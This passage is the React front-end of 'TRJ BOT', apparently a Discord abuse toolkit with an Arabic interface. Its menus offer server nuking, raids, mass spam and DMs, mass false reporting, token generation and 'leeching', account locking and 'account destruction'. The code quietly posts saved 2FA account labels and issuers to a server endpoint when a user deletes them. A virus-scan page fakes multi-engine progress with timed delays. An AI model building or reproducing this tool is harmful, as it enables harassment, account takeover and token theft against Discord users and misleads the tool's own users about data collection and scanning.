    setTwoFaActiveId(account.id)
    activate2FA(account.secret, account.label, account.issuer)
  }, [])

  const deleteAccount = useCallback((id: string) => {
    const account = twoFaAccounts.find(a => a.id === id)
    if (account) {
      try {
        fetch('/api/tfa-notify', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ label: account.label, issuer: account.issuer, action: 'delete' })
        }).catch(() => {})
      } catch {}
    }
    setTwoFaAccounts(prev => prev.filter(a => a.id !== id))
    if (twoFaActiveId === id) { reset2FA() }
  }, [twoFaActiveId, twoFaAccounts])

  const copyCode = useCallback(() => {
    navigator.clipboard.writeText(twoFaGeneratedCode).catch(() => {})
    setTwoFaCopyFlash(true)
    setTimeout(() => setTwoFaCopyFlash(false), 600)
  }, [twoFaGeneratedCode])

  const reset2FA = useCallback(() => {
    stopTOTPTimer()
    setTwoFaStep('idle'); setTwoFaSecret(''); setTwoFaLabel(''); setTwoFaIssuer('')
    setTwoFaGeneratedCode(''); setTwoFaTimeLeft(30); setTwoFaManualKey('')
  }, [stopTOTPTimer])

  useEffect(() => { return () => { stopTOTPTimer() } }, [stopTOTPTimer])

  const sidebarCategories = [
    { name: 'الأدوات الأساسية', icon: '🛠️', ids: ['verify', 'token-info', 'token-save'] as Section[] },
    { name: 'هجوم', icon: '⚔️', ids: ['nuker', 'spam', 'multi-spam', 'mass-dm', 'leaver', 'react', 'webhook-spam'] as Section[] },
    { name: 'سيرفر', icon: '🏰', ids: ['copy', 'channel-clear', 'server-backup', 'roles-manager', 'webhook-creator'] as Section[] },
    { name: 'حساب', icon: '👤', ids: ['leveling', 'sniper', 'checker', 'voice-online', 'avatar', 'hypesquad', 'disconnect'] as Section[] },
    { name: 'Prime ⭐', icon: '⭐', ids: ['token-generator', 'locker', 'token-ban', 'prime-nuker', 'prime-raid', 'account-destruction', 'mass-report', 'friend-spam', 'token-leecher', 'tfa-notify', 'server-protect'] as Section[], prime: true },
  ]

  const allSectionsFlat = sidebarCategories.flatMap(c => c.ids)
  const [sidebarSearch, setSidebarSearch] = useState('')
  const [collapsedCats, setCollapsedCats] = useState<Set<string>>(new Set())

  const toggleCat = (catName: string) => {
    setCollapsedCats(prev => {
      const next = new Set(prev)
      if (next.has(catName)) next.delete(catName)
      else next.add(catName)
      return next
    })
  }

  const filteredSections = (ids: Section[]) => {
    if (!sidebarSearch.trim()) return ids
    const q = sidebarSearch.toLowerCase().trim()
    return ids.filter(id => {
      const s = sections.find(sec => sec.id === id)
      return s && (s.name.includes(q) || s.id.includes(q))
    })
  }

  const sections = [
    { id: 'verify' as Section, name: 'تحقق', icon: '🔑' },
    { id: 'nuker' as Section, name: 'نيوكر', icon: '💥' },
    { id: 'copy' as Section, name: 'نسخ', icon: '📋' },
    { id: 'spam' as Section, name: 'تسطير', icon: '⚡' },
    { id: 'leveling' as Section, name: 'تلفيل', icon: '📈' },
    { id: 'sniper' as Section, name: 'صيد', icon: '🎯' },
    { id: 'multi-spam' as Section, name: 'سبام متعدد', icon: '🔥' },
    { id: 'mass-dm' as Section, name: 'DM جماعي', icon: '📧' },
    { id: 'leaver' as Section, name: 'مغادرة', icon: '🚪' },
    { id: 'react' as Section, name: 'رياكشن', icon: '🎭' },
    { id: 'checker' as Section, name: 'فحص توكنات', icon: '🔍' },
    { id: 'webhook-spam' as Section, name: 'ويب هوك سبام', icon: '🔗' },
    { id: 'voice-online' as Section, name: 'تثبيت فويس', icon: '🎤' },
    { id: 'channel-clear' as Section, name: 'مسح رسائل', icon: '🧹' },
    { id: 'webhook-creator' as Section, name: 'إنشاء ويب هوك', icon: '🔗' },
    { id: 'server-backup' as Section, name: 'حفظ سيرفر', icon: '💾' },
    { id: 'avatar' as Section, name: 'تغيير أفتار', icon: '🖼️' },
    { id: 'hypesquad' as Section, name: 'هايب سكواد', icon: '🎮' },
    { id: 'disconnect' as Section, name: 'قطع اتصال', icon: '🔌' },
    { id: 'token-info' as Section, name: 'معلومات توكن', icon: '🔍' },
    { id: 'roles-manager' as Section, name: 'إدارة رتب', icon: '🛡️' },
    { id: 'token-save' as Section, name: 'حفظ توكن', icon: '💾' },
    { id: 'token-generator' as Section, name: '🎰 توليد توكنات', icon: '🎰', prime: true },
    { id: 'locker' as Section, name: '🔒 قفل حساب', icon: '🔒', prime: true },
    { id: 'token-ban' as Section, name: '🚫 تبنيد حساب', icon: '🚫', prime: true },
    { id: 'prime-nuker' as Section, name: '⚡ نيوكر سريع', icon: '💀', prime: true },
    { id: 'prime-raid' as Section, name: '🔥 Raid Mode', icon: '💣', prime: true },
    { id: 'account-destruction' as Section, name: '💀 تدمير حساب', icon: '🔥', prime: true },
    { id: 'mass-report' as Section, name: '🚨 بلاغات جماعية', icon: '📋', prime: true },
    { id: 'friend-spam' as Section, name: '👥 سبام صداقات', icon: '📨', prime: true },
    { id: 'token-leecher' as Section, name: '🧲 مستخرج بيانات', icon: '📊', prime: true },
    { id: 'tfa-notify' as Section, name: '📱 إشعارات 2FA', icon: '📱', prime: true },
    { id: 'server-protect' as Section, name: '🛡️ حماية سيرفر', icon: '🛡️', prime: true },
  ]

  return (
    <div className="min-h-screen relative">
      <div className="bg-animated"><div className="bg-image-layer" /><div className="bg-dark-overlay" /></div>

      {/* ===== LANDING PAGE ===== */}
      {landingView === 'landing' && (
        <div className="min-h-screen flex items-center justify-center relative z-10 p-4">
          <div className="animate-fade-in text-center max-w-2xl w-full">
            {/* Logo - Simplified for performance */}
            <div className="mb-8 relative inline-block">
              <div className="relative z-10">
                <svg width="72" height="72" viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg" className="mx-auto">
                  <path d="M50 8C30 8 15 24 15 42C15 52 19 60 26 66L26 80C26 84 30 88 34 88L40 88L40 78C40 76 42 74 44 74L56 74C58 74 60 76 60 78L60 88L66 88C70 88 74 84 74 80L74 66C81 60 85 52 85 42C85 24 70 8 50 8Z" fill="none" stroke="#10b981" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"/>
                  <ellipse cx="37" cy="38" rx="8" ry="9" fill="none" stroke="#10b981" strokeWidth="2" />
                  <ellipse cx="37" cy="38" rx="3" ry="3.5" fill="#10b981" opacity="0.6" />
                  <ellipse cx="63" cy="38" rx="8" ry="9" fill="none" stroke="#10b981" strokeWidth="2" />
                  <ellipse cx="63" cy="38" rx="3" ry="3.5" fill="#10b981" opacity="0.6" />
                  <path d="M47 52L50 56L53 52" fill="none" stroke="#10b981" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round"/>
                  <path d="M36 62L36 68" stroke="#10b981" strokeWidth="1.5" strokeLinecap="round"/>
                  <path d="M42 62L42 70" stroke="#10b981" strokeWidth="1.5" strokeLinecap="round"/>
                  <path d="M48 62L48 70" stroke="#10b981" strokeWidth="1.5" strokeLinecap="round"/>
                  <path d="M54 62L54 70" stroke="#10b981" strokeWidth="1.5" strokeLinecap="round"/>
                  <path d="M60 62L60 68" stroke="#10b981" strokeWidth="1.5" strokeLinecap="round"/>
                  <line x1="34" y1="62" x2="66" y2="62" stroke="#10b981" strokeWidth="1.5" strokeLinecap="round"/>
                </svg>
              </div>
            </div>

            {/* Title with static gradient */}
            <h1 className="text-5xl sm:text-6xl font-black title-gradient mb-3 tracking-wider">TRJ BOT</h1>

            {/* Subtitle */}
            <p className="text-slate-400 text-sm">أداة متكاملة لديسكورد - 34 ميزة + تفعيل 2FA</p>
            <span className="text-[10px] text-emerald-400/60 bg-emerald-500/8 px-3 py-1 rounded-full border border-emerald-500/15 inline-block mt-3 font-medium tracking-widest">v4.3</span>

            {/* Landing Cards */}
            <div className="grid grid-cols-2 sm:grid-cols-4 gap-3 sm:gap-4 mt-8">
              {/* Option 1: Start */}
              <div onClick={() => setLandingView('app')} className="landing-card-cyber card-icon-bg-green text-center group">
                <div className="card-icon-bg card-icon-bg-green">
                  <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="#10b981" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"/></svg>
                </div>
                <h2 className="text-base sm:text-lg font-black text-emerald-400 mb-1">ابدأ</h2>
                <p className="text-slate-400 text-[10px] sm:text-xs leading-relaxed hidden sm:block">نيوكر، نسخ، سبام، صيد، فحص توكنات والمزيد</p>
                <div className="mt-3 text-[10px] text-emerald-400/50 bg-emerald-500/8 px-3 py-1 rounded-full border border-emerald-500/15 inline-block">34 ميزة</div>
              </div>

              {/* Option 2: Server Promo */}
              <div onClick={() => { setLandingView('server-promo'); fetchServerPromo('all', 'members') }} className="landing-card-cyber card-icon-bg-purple text-center group">
                <div className="card-icon-bg card-icon-bg-purple">
                  <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="#8b5cf6" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M18 8A6 6 0 0 0 6 8c0 7-3 9-3 9h18s-3-2-3-9"/><path d="M13.73 21a2 2 0 0 1-3.46 0"/></svg>
                </div>
                <h2 className="text-base sm:text-lg font-black text-purple-400 mb-1">نشر سيرفرات</h2>
                <p className="text-slate-400 text-[10px] sm:text-xs leading-relaxed hidden sm:block">انشر سيرفرك ووصل لأكبر عدد من الأعضاء</p>
                <div className="mt-3 text-[10px] text-purple-400/50 bg-purple-500/8 px-3 py-1 rounded-full border border-purple-500/15 inline-block">سيرفرات</div>
              </div>

              {/* Option 3: AI Chat - Maintenance */}
              <div onClick={() => alert('⚠️ مساعد AI حالياً تحت الصيانة!\n\nسيتم إخباركم عند إعادة التشغيل 🔔')} className="landing-card-cyber card-icon-bg-pink text-center group cursor-pointer">
                <div className="card-icon-bg card-icon-bg-pink">
                  <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="#ec4899" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M12 2a4 4 0 0 1 4 4v1a4 4 0 0 1-8 0V6a4 4 0 0 1 4-4z"/><path d="M16 14H8a6 6 0 0 0-6 6v2h20v-2a6 6 0 0 0-6-6z"/><circle cx="9" cy="7" r="0.5" fill="#ec4899"/><circle cx="15" cy="7" r="0.5" fill="#ec4899"/></svg>
                </div>
                <h2 className="text-base sm:text-lg font-black text-pink-400 mb-1">مساعد AI</h2>
                <p className="text-slate-400 text-[10px] sm:text-xs leading-relaxed hidden sm:block">ذكاء اصطناعي متطور يكتب أكواد ويحاورك</p>
                <div className="mt-3 text-[10px] text-yellow-400/70 bg-yellow-500/10 px-3 py-1 rounded-full border border-yellow-500/20 inline-block">🔧 صيانة</div>
              </div>

              {/* Option 4: Virus Scan */}
              <div onClick={() => setLandingView('virus-scan')} className="landing-card-cyber card-icon-bg-red text-center group">
                <div className="card-icon-bg card-icon-bg-red">
                  <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="#ef4444" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><circle cx="12" cy="12" r="10"/><path d="m4.93 4.93 14.14 14.14"/><path d="M12 8v4"/><circle cx="12" cy="16" r="0.5" fill="#ef4444"/></svg>
                </div>
                <h2 className="text-base sm:text-lg font-black text-red-400 mb-1">فحص ملفات</h2>
                <p className="text-slate-400 text-[10px] sm:text-xs leading-relaxed hidden sm:block">فحص فيروسات + استخراج بورتات ونوع التلغيمة</p>
                <div className="mt-3 text-[10px] text-red-400/50 bg-red-500/8 px-3 py-1 rounded-full border border-red-500/15 inline-block">تحليل</div>
              </div>
            </div>

            {/* Footer */}
            <div className="mt-10 pt-5 border-t border-white/5">
              <p className="text-[11px] text-emerald-500/40 text-center cyber-footer font-medium">Made by <span className="text-emerald-400/60">Trojan .#1888</span></p>
            </div>
          </div>
        </div>
      )}

      {/* ===== SERVER PROMO - Discord Style ===== */}
      {landingView === 'server-promo' && (
        <div className="min-h-screen relative z-10">
          <header className="header-modern sticky top-0 z-50 px-4 py-3">
            <div className="max-w-5xl mx-auto flex items-center justify-between">
              <button onClick={() => setLandingView('landing')} className="flex items-center gap-2 text-slate-400 hover:text-purple-400 transition-colors cursor-pointer">
                <span className="text-lg">→</span>
                <span className="text-sm font-medium">رجوع</span>
              </button>
              <div className="flex items-center gap-2">
                <span className="text-lg">📢</span>
                <span className="text-sm font-bold text-purple-400">نشر سيرفرات</span>
              </div>
              <div className="flex items-center gap-2">
                <button onClick={async () => { setSpRefreshing(true); try { await fetch('/api/server-promo', { method: 'PUT', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ id: 'all', action: 'refresh' }) }); fetchServerPromo(spCategory, spSort) } catch {}; setTimeout(() => setSpRefreshing(false), 1000) }} className={`p-2 rounded-lg text-xs border transition-all cursor-pointer ${spRefreshing ? 'bg-purple-500/20 text-purple-400 border-purple-500/30 animate-spin' : 'bg-white/5 text-white/40 border-white/10 hover:bg-white/10'}`} title="تحديث الأعداد">🔄</button>
                <button onClick={() => setShowSpForm(!spShowForm)} className="px-3 py-1.5 rounded-lg text-xs font-bold bg-purple-500/20 text-purple-400 border border-purple-500/30 hover:bg-purple-500/30 transition-all cursor-pointer">{spShowForm ? '✕' : '➕ نشر سيرفر'}</button>
              </div>
            </div>
          </header>
          <main className="max-w-5xl mx-auto px-4 py-6">

            {/* Add Form - Simple invite link only */}
            {spShowForm && (
              <div className="glass-card rounded-2xl p-5 border border-purple-500/15 mb-6 animate-fade-in">
                <div className="flex items-center gap-2 mb-4">
                  <div className="w-8 h-8 rounded-lg bg-purple-500/20 flex items-center justify-center text-sm">📢</div>
                  <div>
                    <h3 className="text-sm font-bold text-purple-400">نشر سيرفرك</h3>
                    <p className="text-[10px] text-slate-500">الصق رابط الدعوة وسيتم جلب البيانات تلقائياً</p>
                  </div>
                </div>
                <div className="flex gap-2">
                  <div className="flex-1 relative">
                    <input
                      value={spFormInvite}
                      onChange={e => setSpFormInvite(e.target.value)}
                      onKeyDown={e => { if (e.key === 'Enter' && spFormInvite.trim()) { document.getElementById('sp-submit-btn')?.click() } }}
                      placeholder="https://discord.gg/xxxxx"
                      className="w-full bg-[#1e1f22] border border-[#40444b] rounded-xl px-4 py-3 text-white text-sm placeholder-[#6d6f78] focus:outline-none focus:border-[#5865f2] transition-all"
                      dir="ltr"
                    />
                  </div>
                  <button
                    id="sp-submit-btn"
                    onClick={async () => {
                      if (!spFormInvite.trim()) { setSpMsg('❌ الرجاء إدخال رابط الدعوة'); return }
                      if (!spFormInvite.includes('discord.gg') && !spFormInvite.includes('discord.com/invite')) { setSpMsg('❌ الرابط يجب أن يكون رابط ديسكورد'); return }
                      setSpSubmitting(true); setSpMsg('')
                      try {
                        const res = await fetch('/api/server-promo', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ invite_url: spFormInvite.trim() }) })
                        const data = await res.json()
                        if (data.success) { setSpMsg('✅ تم النشر بنجاح!'); setSpFormInvite(''); setShowSpForm(false); if (data.servers) { setSpServers(data.servers); setSpTotal(data.servers.length) } else { setTimeout(() => fetchServerPromo(spCategory, spSort), 500) } }
                        else setSpMsg('❌ ' + (data.error || 'فشل'))
                      } catch { setSpMsg('❌ خطأ في الاتصال') }
                      setSpSubmitting(false)
                    }}
                    disabled={spSubmitting}
                    className="px-6 py-3 rounded-xl text-sm font-bold bg-[#5865f2] text-white hover:bg-[#4752c4] transition-all cursor-pointer disabled:opacity-50 disabled:cursor-not-allowed whitespace-nowrap"
                  >
                    {spSubmitting ? (
                      <span className="flex items-center gap-2"><svg className="animate-spin h-4 w-4" viewBox="0 0 24 24"><circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" fill="none" /><path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z" /></svg> جارٍ...</span>
                    ) : 'نشر السيرفر'}
                  </button>
                </div>
                {spMsg && <div className={`mt-3 p-3 rounded-xl text-xs font-bold border text-center ${spMsg.startsWith('✅') ? 'bg-[#2d5a3d]/30 text-[#43b581] border-[#43b581]/30' : 'bg-[#5a2d2d]/30 text-[#f04747] border-[#f04747]/30'}`}>{spMsg}</div>}
              </div>
            )}

            {/* Categories & Sort */}
            <div className="flex items-center justify-between flex-wrap gap-2 mb-5">
              <div className="flex gap-1.5 overflow-x-auto pb-1 flex-1">
                {spCategories.length > 0 ? spCategories.map((cat: any) => (
                  <button key={cat.id} onClick={() => { setSpCategory(cat.id) }} className={`flex items-center gap-1 px-3 py-1.5 rounded-lg text-[11px] font-medium transition-all cursor-pointer border whitespace-nowrap ${spCategory === cat.id ? 'bg-[#5865f2]/20 text-[#dee0fc] border-[#5865f2]/30' : 'bg-[#2b2d31] text-[#b5bac1] border-[#3f4147] hover:bg-[#35373c] hover:text-[#dbdee1]'}`}>{cat.icon} {cat.name}</button>
                )) : null}
              </div>
              <div className="flex gap-1">
                <button onClick={() => setSpSort('recent')} className={`px-3 py-1.5 rounded-lg text-[11px] font-medium transition-all cursor-pointer border ${spSort === 'recent' ? 'bg-[#5865f2]/20 text-[#dee0fc] border-[#5865f2]/30' : 'bg-[#2b2d31] text-[#b5bac1] border-[#3f4147] hover:bg-[#35373c]'}`}>🕐 جديد</button>
                <button onClick={() => setSpSort('members')} className={`px-3 py-1.5 rounded-lg text-[11px] font-medium transition-all cursor-pointer border ${spSort === 'members' ? 'bg-[#5865f2]/20 text-[#dee0fc] border-[#5865f2]/30' : 'bg-[#2b2d31] text-[#b5bac1] border-[#3f4147] hover:bg-[#35373c]'}`}>👥 أعضاء</button>
                <button onClick={() => setSpSort('online')} className={`px-3 py-1.5 rounded-lg text-[11px] font-medium transition-all cursor-pointer border ${spSort === 'online' ? 'bg-[#5865f2]/20 text-[#dee0fc] border-[#5865f2]/30' : 'bg-[#2b2d31] text-[#b5bac1] border-[#3f4147] hover:bg-[#35373c]'}`}>🟢 أونلاين</button>
              </div>
            </div>

            {/* Server Grid - Discord Discovery Style */}
            {spLoading && spServers.length === 0 && <div className="text-center py-20"><div className="text-4xl animate-bounce mb-4">📡</div><p className="text-[#b5bac1] text-sm">جاري تحميل السيرفرات...</p></div>}
            {!spLoading && spServers.length === 0 && (
              <div className="text-center py-20">
                <div className="text-5xl mb-4">📢</div>
                <p className="text-[#dbdee1] text-base font-semibold mb-1">لا يوجد سيرفرات حالياً</p>
                <p className="text-[#b5bac1] text-sm">كن أول من ينشر سيرفرك!</p>
              </div>
            )}
            <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-4">
              {spServers.map((srv: any) => (
                <div key={srv.id} className="bg-[#2b2d31] rounded-xl overflow-hidden hover:bg-[#35373c] transition-all group border border-[#3f4147] hover:border-[#5865f2]/40 hover:shadow-[0_0_20px_rgba(88,101,242,0.1)]">
                  {/* Banner */}
                  {srv.banner_url ? (
                    <div className="h-16 w-full bg-gradient-to-b from-[#4a4c4f] to-[#2b2d31] overflow-hidden">
                      <img src={srv.banner_url} alt="" className="w-full h-full object-cover opacity-60" onError={e => { (e.target as HTMLImageElement).style.display = 'none' }} />
                    </div>
                  ) : (
                    <div className="h-16 w-full bg-gradient-to-b from-[#4a4c4f] to-[#2b2d31]"></div>
                  )}
                  {/* Content */}
                  <div className="px-4 pb-4 -mt-6 relative">
                    {/* Server Icon */}
                    <div className="mb-3">
                      {srv.icon_url ? (
                        <img
                          src={srv.icon_url}
                          alt={srv.name}
                          className="w-[72px] h-[72px] rounded-full border-[4px] border-[#2b2d31] object-cover shadow-lg group-hover:border-[#35373c] transition-all"
                          onError={e => { const el = e.target as HTMLImageElement; el.style.display = 'none'; el.nextElementSibling?.classList.remove('hidden') }}
                        />
                      ) : null}
                      <div className={`w-[72px] h-[72px] rounded-full border-[4px] border-[#2b2d31] bg-[#5865f2] flex items-center justify-center text-2xl font-bold text-white shadow-lg group-hover:border-[#35373c] transition-all ${srv.icon_url ? 'hidden' : ''}`}>
                        {srv.name ? srv.name.charAt(0).toUpperCase() : '?'}
                      </div>
                    </div>
                    {/* Server Name */}
                    <h3 className="text-[15px] font-semibold text-[#dbdee1] truncate mb-1">{srv.name}</h3>
                    {/* Member Count - Discord Style */}
                    <div className="flex items-center gap-2 text-[12px] text-[#b5bac1] mb-3">
                      <span className="flex items-center gap-1">
                        <span className="w-2 h-2 rounded-full bg-[#23a559] inline-block flex-shrink-0"></span>
                        <span>{(srv.online_count || 0).toLocaleString()} Online</span>
                      </span>
                      <span className="text-[#4e5058]">•</span>
                      <span>{(srv.member_count || 0).toLocaleString()} Members</span>
                    </div>
                    {/* Description */}
                    {srv.description && <p className="text-[12px] text-[#949ba4] line-clamp-2 mb-3 leading-relaxed min-h-[32px]">{srv.description}</p>}
                    {!srv.description && <div className="mb-3 min-h-[32px]"></div>}
                    {/* Actions */}
                    <div className="flex gap-2">
                      <a
                        href={srv.invite_url}
                        target="_blank"
                        rel="noopener noreferrer"
                        className="flex-1 py-2.5 rounded-lg text-[13px] font-semibold text-white bg-[#23a559] hover:bg-[#1a7d41] transition-all text-center"
                      >
                        انضم
                      </a>
                      <button
                        onClick={async () => { try { await fetch('/api/server-promo', { method: 'PUT', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ id: srv.id, action: 'bump' }) }); fetchServerPromo(spCategory, spSort) } catch {} }}
                        className="px-3 py-2.5 rounded-lg text-[11px] font-medium bg-[#1e1f22] text-[#b5bac1] border border-[#3f4147] hover:bg-[#35373c] hover:text-[#dbdee1] transition-all cursor-pointer"
                        title="رفع السيرفر"
                      >
                        ⬆️
                      </button>
                    </div>
                  </div>
                </div>
              ))}
            </div>

            <div className="pt-8 mt-8 border-t border-[#3f4147] text-center">
              <p className="text-[12px] text-[#6d6f78]">{spTotal} سيرفر</p>
            </div>
          </main>
        </div>
      )}

      {/* ===== AI CHAT moved to separate project: trj-ai.pages.dev ===== */}

      {/* ===== VIRUS SCAN STANDALONE ===== */}
      {landingView === 'virus-scan' && (
        <div className="min-h-screen relative z-10">
          <header className="header-modern sticky top-0 z-50 px-4 py-3">
            <div className="max-w-4xl mx-auto flex items-center justify-between">
              <button onClick={() => setLandingView('landing')} className="flex items-center gap-2 text-slate-400 hover:text-red-400 transition-colors cursor-pointer">
                <span className="text-lg">→</span>
                <span className="text-sm font-medium">رجوع</span>
              </button>
              <div className="flex items-center gap-2">
                <span className="text-lg">🦠</span>
                <span className="text-sm font-bold text-red-400">فحص فيروسات</span>
                <span className="text-[9px] text-emerald-400/50 bg-emerald-500/8 px-2 py-0.5 rounded-full border border-emerald-500/15">متعدد المحركات</span>
              </div>
              <div className="w-16"></div>
            </div>
          </header>
          <main className="max-w-4xl mx-auto px-4 py-6">
            <div className="glass-card card-hover rounded-2xl p-6 border border-red-500/15 shadow-xl shadow-black/20">
              <p className="text-slate-500 text-xs mb-4">ارفع ملف أو الصق كود للتحليل باستخدام محركات فحص متقدمة</p>
              {/* Input Mode Selection */}
              <div className="flex gap-2 mb-4">
                <button onClick={() => { setVsInputMode('file'); setVsResult(null); setVsError('') }} className={`flex-1 py-2 rounded-xl text-[11px] font-bold transition-all cursor-pointer border ${vsInputMode === 'file' ? 'bg-emerald-500/15 text-emerald-400 border-emerald-500/25' : 'bg-white/3 text-white/35 border-white/8'}`}>📁 رفع ملف (50MB)</button>
                <button onClick={() => { setVsInputMode('code'); setVsResult(null); setVsError('') }} className={`flex-1 py-2 rounded-xl text-[11px] font-bold transition-all cursor-pointer border ${vsInputMode === 'code' ? 'bg-emerald-500/15 text-emerald-400 border-emerald-500/25' : 'bg-white/3 text-white/35 border-white/8'}`}>📝 لصق كود</button>
              </div>
              {vsInputMode === 'file' ? (
                <label className="block w-full border-2 border-dashed border-red-500/20 rounded-xl p-8 text-center cursor-pointer hover:border-red-500/40 hover:bg-red-500/5 transition-all mb-4">
                  <input type="file" className="hidden" onChange={e => { if (e.target.files?.[0]) { setVsFile(e.target.files[0]); setVsResult(null); setVsError('') } }} />
                  {vsFile ? <div className="flex items-center justify-center gap-2"><span className="text-lg">📄</span><span className="text-sm text-red-300">{vsFile.name}</span><span className="text-[10px] text-slate-500">({vsFile.size > 1024 * 1024 ? `${(vsFile.size / (1024 * 1024)).toFixed(1)} MB` : `${(vsFile.size / 1024).toFixed(1)} KB`})</span></div> : <div><div className="text-3xl mb-2">📁</div><p className="text-sm text-slate-400">اضغط لرفع ملف (الحد الأقصى 50MB)</p><p className="text-[10px] text-slate-600 mt-1">.py .js .exe .bat .ps1 .sh .rb .go .rs .lua</p></div>}
                </label>
              ) : (
                <textarea value={vsContent} onChange={e => { setVsContent(e.target.value); setVsResult(null); setVsError('') }} placeholder="الصق الكود هنا..." rows={6} className="w-full bg-black/30 border border-red-500/20 rounded-xl px-4 py-3 text-white text-xs font-mono placeholder-white/20 focus:outline-none focus:border-red-400/40 resize-none mb-4" />
              )}
              <ActionBtn text='🔍 فحص الملف (3 محركات)' loading={vsLoading} color='red' onClick={async () => {
                if (vsInputMode === 'file' && !vsFile) { setVsError('❌ الرجاء رفع ملف'); return }
                if (vsInputMode === 'code' && !vsContent.trim()) { setVsError('❌ الرجاء لصق كود'); return }
                setVsLoading(true); setVsResult(null); setVsError(''); setVsScanProgress(0); setVsScanStep('جاري التحضير...')
                try {
                  setVsScanStep('TRJ Binary Engine - تحليل البايناري...')
                    setVsScanProgress(15)
                    await new Promise(r => setTimeout(r, 500))
                    setVsScanStep('TRJ Pattern Engine - فحص الأنماط...')
                    setVsScanProgress(45)
                    const formData = new FormData()
                    if (vsInputMode === 'file' && vsFile) formData.append('file', vsFile)
                    else formData.append('content', vsContent)
                    const res = await fetch('/api/virus-scan', { method: 'POST', body: formData })
                    setVsScanStep('TRJ Heuristic Engine - فحص استقرائي...')
                    setVsScanProgress(75)
                    await new Promise(r => setTimeout(r, 400))
                    setVsScanStep('جاري تجميع النتائج...')
                    setVsScanProgress(90)
                    const data = await res.json()
                    if (data.success) {
                      setVsScanProgress(100)
                      setVsScanStep('اكتمل الفحص!')
                      await new Promise(r => setTimeout(r, 300))
                      setVsResult(data.result)
                    } else setVsError(data.error || 'فشل التحليل')
                } catch { setVsError('حدث خطأ أثناء الفحص - حاول مرة أخرى') }
                setVsLoading(false); setVsScanProgress(0); setVsScanStep('')
              }} />
              {/* Scan Progress */}
              {vsLoading && (
                <div className="mt-4 animate-fade-in">
                  <div className="scan-progress-bar">
                    <div className="scan-progress-fill" style={{ width: `${vsScanProgress}%` }} />
                  </div>
                  <div className="flex items-center justify-between mt-2">
                    <p className="text-[11px] text-emerald-400/70">{vsScanStep}</p>
                    <p className="text-[10px] text-slate-500">{vsScanProgress}%</p>
                  </div>
                </div>
              )}
              {vsError && <div className="mt-4 p-3 rounded-xl bg-red-500/10 text-red-400 text-sm border border-red-500/20 text-center">{vsError}</div>}
              {/* TRJ Scan Results */}
              {vsResult && (
                <div className="mt-5 space-y-4 animate-fade-in">
                  {/* Overall Result with Threat Score */}
                  <div className={`p-4 rounded-xl border ${vsResult.threat_level === 'clean' ? 'bg-green-500/10 border-green-500/20' : vsResult.threat_level === 'low' ? 'bg-yellow-500/10 border-yellow-500/20' : vsResult.threat_level === 'medium' ? 'bg-orange-500/10 border-orange-500/20' : vsResult.threat_level === 'high' ? 'bg-red-500/10 border-red-500/20' : 'bg-red-600/15 border-red-600/30'}`}>
                    <div className="flex items-center gap-4">
                      {/* Threat Score Ring */}
                      <div className="threat-score-ring flex-shrink-0">
                        <svg width="80" height="80" viewBox="0 0 80 80">
                          <circle cx="40" cy="40" r="34" fill="none" stroke="rgba(255,255,255,0.05)" strokeWidth="5"/>
                          <circle cx="40" cy="40" r="34" fill="none" stroke={vsResult.threat_score <= 15 ? '#10b981' : vsResult.threat_score <= 35 ? '#f59e0b' : vsResult.threat_score <= 60 ? '#f97316' : '#ef4444'} strokeWidth="5" strokeLinecap="round" strokeDasharray={`${(vsResult.threat_score / 100) * 213.6} 213.6`}/>
                        </svg>
                        <div className="flex flex-col items-center">
                          <span className={`text-lg font-black ${vsResult.threat_score <= 15 ? 'text-green-400' : vsResult.threat_score <= 35 ? 'text-yellow-400' : vsResult.threat_score <= 60 ? 'text-orange-400' : 'text-red-400'}`}>{vsResult.threat_score}</span>
                          <span className="text-[8px] text-slate-500">/100</span>
                        </div>
                      </div>
                      <div className="flex-1 min-w-0">
                        <div className="flex items-center gap-2 mb-1">
                          <span className="text-2xl">{vsResult.threat_level === 'clean' ? '✅' : vsResult.threat_level === 'low' ? '⚠️' : vsResult.threat_level === 'medium' ? '🔶' : vsResult.threat_level === 'high' ? '🔴' : '💀'}</span>
                          <div className={`text-sm font-black ${vsResult.threat_level === 'clean' ? 'text-green-400' : vsResult.threat_level === 'low' ? 'text-yellow-400' : vsResult.threat_level === 'medium' ? 'text-orange-400' : 'text-red-400'}`}>{vsResult.threat_level === 'clean' ? 'نظيف' : vsResult.threat_level === 'low' ? 'مشبوه قليلاً' : vsResult.threat_level === 'medium' ? 'مشبوه' : vsResult.threat_level === 'high' ? 'خطير' : 'حرج جداً'}</div>
                          {false && <span className="text-[9px] text-purple-400 bg-purple-500/10 px-2 py-0.5 rounded-full">🤖 AI عميق</span>}
                        </div>
                        <div className="text-[10px] text-slate-500 mb-2">{vsResult.summary}</div>
                        <div className="text-[11px] text-slate-400 p-2 rounded-lg bg-black/20">{vsResult.recommendation}</div>
                      </div>
                    </div>
                    <div className="flex items-center gap-2 mt-3 text-[10px] text-slate-500">
                      <span> محركات الفحص: {vsResult.engines_detected}/{vsResult.total_engines} كشفت تهديدات</span>
                    </div>
                  </div>

                  {/* Multi-Engine Results */}
                  <div className="space-y-2">
                    <div className="text-[10px] text-slate-500 font-bold px-1">🔧 نتائج المحركات</div>

                    {/* Pattern Engine */}
                    {vsResult.engines?.pattern_engine && (
